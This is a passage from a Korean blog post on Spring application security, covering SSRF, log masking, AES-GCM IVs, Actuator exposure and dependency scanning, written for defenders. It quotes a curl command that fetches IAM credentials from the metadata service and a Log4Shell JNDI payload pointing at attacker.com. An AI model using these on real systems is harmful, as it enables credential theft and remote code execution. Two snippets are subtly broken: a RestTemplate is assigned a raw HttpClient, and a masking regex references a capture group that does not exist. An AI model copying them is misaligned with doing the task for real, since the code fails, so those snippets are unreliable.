@@ -1,0 +1,131 @@
+---
+title: "서버가 공격자의 손이 되는 순간 — Spring 보안 설계의 5가지 원칙"
+description: "SSRF부터 의존성 취약점까지, 클라우드 시대의 Spring 애플리케이션이 마주하는 공격 패턴과 그 방어 설계를 관통하는 하나의 질문을 추적한다."
+pubDate: 2026-05-02
+category: dev
+tags: [spring, security, ssrf, encryption, dependency-management]
+difficulty: intermediate
+series:
+  slug: security-engineering-deep-dive
+  title: Security Engineering Deep Dive
+  order: 1
+draft: false
+featured: false
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+import Aside from '@/components/mdx/Aside.astro';
+
+Capital One 사건(2019)의 공격자는 취약한 로드밸런서 하나를 통해 AWS IAM 자격증명을 획득했고, 1억 6천만 명의 개인정보를 유출했다. Log4Shell(2021) 공격자는 로그 한 줄에 JNDI 표현식을 삽입해 서버 제어권을 가져갔다. 이 사건들은 전혀 다른 취약점처럼 보이지만 같은 질문에서 시작한다 — **서버가 신뢰해서는 안 되는 것을 신뢰하고 있지 않은가?**
+
+## SSRF — 서버의 신뢰를 무기로
+
+SSRF(Server-Side Request Forgery)는 공격자가 지정한 URL을 서버가 대신 요청하도록 강제하는 취약점이다. 클라우드 환경에서 이 취약점이 치명적인 이유는 `169.254.169.254` 때문이다.
+
+```bash
+# IMDSv1 환경에서 단일 GET 요청으로 자격증명 획득
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
+# → AccessKeyId, SecretAccessKey, Token 전부 반환
+```
+
+AWS EC2의 메타데이터 서비스는 로컬호스트에서 온 요청을 무조건 신뢰한다. 방화벽은 외부에서의 접근을 막지만, SSRF가 있으면 서버가 스스로 내부망 요청을 대신 실행해준다.
+
+방어의 출발점은 두 가지다. 첫째, URL 화이트리스트 + 내부 IP 차단. 호스트명을 DNS로 해석한 IP가 RFC1918 범위(`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) 또는 링크-로컬(`169.254.0.0/16`)에 속하면 차단한다. 둘째, 리다이렉션 비활성화.
+
+```java
+RestTemplate safeRestTemplate = HttpClientBuilder.create()
+    .disableRedirectHandling()  // 302 리다이렉션을 따라가지 않음
+    .build();
+```
+
+공격자는 `http://trusted.example.com/redirect?to=http://169.254.169.254/` 같은 리다이렉션 체인을 쓴다. 화이트리스트 검증을 통과한 뒤 내부망으로 방향을 트는 것이다. AWS 환경이라면 IMDSv2를 반드시 강제해야 한다 — IMDSv2는 먼저 PUT 요청으로 토큰을 발급받아야 하므로, GET-only SSRF는 자동으로 실패한다.
+
+## 민감 데이터는 로그를 통해 누출된다
+
+`@Data` 어노테이션이 붙은 `User` 클래스를 `logger.info("Registering: {}", user)`로 기록하면, `password`, `creditCard`, `ssn` 전부가 로그 파일에 평문으로 쌓인다. 이것은 디버깅의 편의가 보안을 이긴 순간이다.
+
+방어 설계는 두 레이어로 구성된다. 첫째, 로그 전용 DTO 패턴 — 민감 필드를 애초에 포함하지 않는 객체를 만든다. 둘째, Logback 마스킹 필터 — 신용카드, SSN, 이메일, API 키 패턴을 정규식으로 감지해 자동 마스킹한다.
+
+```java
+private static final Pattern CREDIT_CARD_PATTERN =
+    Pattern.compile("\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}");
+
+message = CREDIT_CARD_PATTERN.matcher(message).replaceAll("****-****-****-$2");
+```
+
+예외 핸들러도 마찬가지다. 스택 트레이스를 HTTP 응답에 포함하면 클래스 경로, 라이브러리 버전, SQL 쿼리 구조가 공격자에게 그대로 전달된다. 프로덕션 핸들러는 에러 ID만 반환하고, 상세 내용은 내부 로그에만 기록해야 한다.
+
+## 암호화 설계 — 모드와 IV의 선택
+
+AES를 쓴다고 다 안전하지 않다. 모드 선택이 전부다.
+
+**ECB(Electronic Codebook)** 모드는 같은 평문 블록을 항상 같은 암문으로 변환한다. 이미지를 ECB로 암호화하면 픽셀 패턴이 암문에 그대로 남아 "펭귄 실루엣"이 보인다. 데이터베이스 컬럼을 ECB로 암호화하면 같은 값끼리 동일한 암문을 가져 빈도 분석이 가능하다.
+
+**AES-GCM**을 써야 한다. 그리고 IV(Nonce)는 매번 새로 생성해야 한다.
+
+<Callout type="warning" title="GCM IV 재사용은 치명적">
+같은 키와 같은 IV로 두 메시지를 암호화하면, 두 암문을 XOR했을 때 키스트림이 소거되어 `C1 ⊕ C2 = M1 ⊕ M2`가 된다. M1을 알면 M2를 복원할 수 있다. IV는 절대 재사용하지 않는다.
+</Callout>
+
+안전한 패턴은 다음과 같다 — 96비트 랜덤 IV를 `SecureRandom.getInstanceStrong()`으로 생성하고, 암문 앞에 IV를 붙여 함께 저장한다. IV는 평문이 아니므로 암호화 없이 저장해도 된다. 복호화 시 앞 12바이트를 IV로, 나머지를 암문으로 분리하면 된다.
+
+키 관리는 AWS KMS에 위탁하라. 소스 코드에 하드코딩된 키는 Git 이력을 통해 영구히 노출된다. KMS는 키 로테이션, 접근 감사(CloudTrail), IAM 기반 권한 제어를 제공한다.
+
+## 설정 오류 — 기본값이 공격 면이다
+
+Spring Actuator의 `management.endpoints.web.exposure.include: "*"` 한 줄이 프로덕션에 배포되면, `/actuator/env`에서 `DATABASE_PASSWORD`, `AWS_ACCESS_KEY_ID`, `SLACK_BOT_TOKEN`이 JSON으로 노출된다. Uber 보안 침해(2022)의 경로 중 하나가 이것이었다.
+
+```yaml
+# application-prod.yml
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,metrics  # env, configprops, threaddump 절대 포함 금지
+  endpoint:
+    health:
+      show-details: when-authorized
+```
+
+CORS에서 `allowedOrigins("*")`와 `allowCredentials(true)`를 함께 쓰는 것도 동일한 실수다. 브라우저는 이 조합을 거부하지만 `curl`이나 모바일 앱은 CORS를 검증하지 않는다. 결과적으로 누구나 쿠키를 포함한 요청을 보낼 수 있다.
+
+프로파일 분리는 이 문제의 근본 해법이다. `application-prod.yml`에는 `show-sql: false`, `h2.console.enabled: false`, Actuator 최소 노출을 명시하고, 애플리케이션 시작 시 이 값들을 검증해 배포 실수를 사전에 차단한다.
+
+## 의존성 — 내가 쓰지 않는 코드도 내 코드다
+
+Log4Shell은 `${jndi:ldap://attacker.com/Exploit}`를 로그에 기록하면 Log4j가 JNDI 쿼리를 실행하고, 공격자 서버에서 악성 클래스를 로드해 RCE가 발생하는 취약점이다. CVSS 10.0. 전 세계 수백만 개의 Java 애플리케이션이 영향받았다.
+
+개발자가 직접 Log4j를 import하지 않았더라도 전이 의존성으로 포함될 수 있다. `Spring Boot → 어떤 라이브러리 → Log4j`처럼. 의존성 트리 전체가 공격 면이다.
+
+방어 전략은 세 단계다.
+
+1. **탐지**: `build.gradle`에 OWASP DependencyCheck 플러그인을 추가하고 CI에서 자동 실행. CVSS 7.0 이상이면 빌드 실패.
+2. **추적**: CycloneDX로 SBOM(Software Bill of Materials)을 생성해 모든 의존성을 목록화한다.
+3. **갱신**: Dependabot 또는 Renovate로 취약점 발견 시 자동 PR을 생성한다.
+
+컨테이너 이미지도 스캔 대상이다. `FROM openjdk:8`은 기본 이미지 자체에 수십 개의 알려진 취약점을 포함한다. Trivy로 이미지 레이어와 Java 의존성을 동시에 스캔하라.
+
+<Aside label="우선순위 원칙">
+취약점 발견 시 CVSS 점수만으로 판단하지 않는다. 활성 익스플로잇 존재 여부, 원격 실행 가능 여부, 내부망 노출 여부를 함께 평가해 대응 일정을 정한다. CRITICAL은 24시간, HIGH는 1주, MEDIUM은 1개월이 기준이다.
+</Aside>
+
+## 트레이드오프
+
+<Callout type="note" title="트레이드오프">
+- **화이트리스트 URL 검증**은 보안 수준이 가장 높지만, 허용 도메인이 변경될 때마다 코드 수정이 필요하다.
+- **GCM + 랜덤 IV**는 안전하지만 AWS KMS 호출은 네트워크 레이턴시를 추가한다. Envelope Encryption(데이터를 로컬 AES 키로 암호화하고, 그 키를 KMS로 암호화)으로 호출 빈도를 줄일 수 있다.
+- **Actuator 최소 노출**은 운영 가시성을 낮춘다. Prometheus와 Grafana를 별도 포트로 분리하고 내부망 방화벽으로 보호하면 보안과 가시성을 동시에 얻을 수 있다.
+- **DependencyCheck + Trivy**는 CI 빌드 시간을 수 분 연장한다. 초기 단계 스캔과 최종 단계 스캔을 분리해 병렬로 실행하면 영향을 최소화할 수 있다.
+</Callout>
+
+## 정리
+
+이 다섯 챕터를 관통하는 질문은 하나다 — **"이 경로로 공격자가 신뢰를 획득할 수 있는가?"** SSRF는 서버의 네트워크 신뢰를, 로그 노출은 저장소 접근 신뢰를, ECB/IV 재사용은 암호화 신뢰를, Actuator 노출은 설정 신뢰를, 취약한 의존성은 코드 공급망 신뢰를 각각 깨뜨린다.
+
+- SSRF는 URL 화이트리스트 + 내부 IP 차단 + IMDSv2 강제로 방어한다.
+- 민감 데이터는 로그 DTO 패턴과 Logback 마스킹 필터로 로그에서 격리한다.
+- 암호화는 AES-GCM + 매번 랜덤 IV, 키는 KMS에 위탁한다.
+- Actuator는 `health`와 `metrics`만 노출하고, 프로파일로 개발/프로덕션 설정을 철저히 분리한다.
+- 의존성은 DependencyCheck + Trivy로 CI에서 자동 스캔하고, Dependabot으로 자동 갱신한다.
+
+보안은 기능이 아니라 설계다. 코드를 짜는 순간이 아니라, 아키텍처를 결정하는 순
